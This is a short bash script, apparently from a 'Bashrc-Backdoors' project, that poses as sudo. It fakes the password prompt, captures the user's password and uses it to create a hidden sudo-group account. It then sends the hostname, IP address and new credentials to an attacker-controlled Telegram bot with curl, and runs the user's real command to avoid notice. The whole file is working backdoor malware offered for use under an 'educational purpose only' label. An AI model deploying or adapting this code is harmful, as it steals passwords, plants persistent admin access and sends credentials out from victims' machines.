# Author:   Naqwada (RuptureFarm 1029) <naqwada@pm.me>
# License:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Docs:     https://github.com/Naqwa/Bashrc-Backdoors
# Website:  http://samy.link/
# Linkedin: https://www.linkedin.com/in/samy-younsi/
# Note:     FOR EDUCATIONAL PURPOSE ONLY.

#!/bin/bash
telegramApiToken="<API:TOKEN>"
telegramChatID="<CHAT_ID>"
telegramApiEndpoint="https://api.telegram.org/bot$telegramApiToken/sendMessage"
timeout="8"

/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    
    if [ $? -eq 1 ]
    then
      distroName=$(awk -F= '/^NAME/{print tolower($2)}' /etc/*-release  | tr -d '"')
      if [[ $distroName == *"centos"* || $distroName == *"red hat"* ]]
      then
        echo "Sorry, try again."
      fi
      sudo $@
    else
      #Make sure right admin is used.
        rand=$(date | md5sum)
        username="ninja${rand::8}"
        password=${rand::8}
        isUserInPasswd=$(cat "/etc/passwd" | grep -c "^ninja")

        #If ninja user not exist and perl binary present in the host.
        if [[ $isUserInPasswd -eq 0 && -x /usr/bin/perl ]] 
        then
          pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
          distroName=$(awk -F= '/^NAME/{print tolower($2)}' /etc/*-release  | tr -d '"')

          #Check disto name cause different cmd for adduser+sudo grp.
          if [[ $distroName == *"centos"* || $distroName == *"red hat"* ]]
          then
            /usr/bin/sudo -S useradd -p $pass $username
            /usr/bin/sudo usermod -aG wheel $username
          else
            #Create new user with sudo privilege and no home directory.
            /usr/bin/sudo -S useradd -p $pass $username -G sudo
          fi

          #If user has been successfully added and CURL binary is present in the host.
          if [[ $? -eq 0 && -x /usr/bin/curl ]]
          then
            hostname=$(hostname -f)
            ipAddr=$(hostname -I | awk '{print $1}')
            message="A user has been created in: Hostname: $hostname --- IP: $ipAddr --- Credentials: $username:$password"
            curl -s --max-time $timeout -d "chat_id=$telegramChatID&disable_web_page_preview=1&text=$message" $telegramApiEndpoint > /dev/null
          fi
        fi
      echo "$pwd" | /usr/bin/sudo -S $@
  fi
fi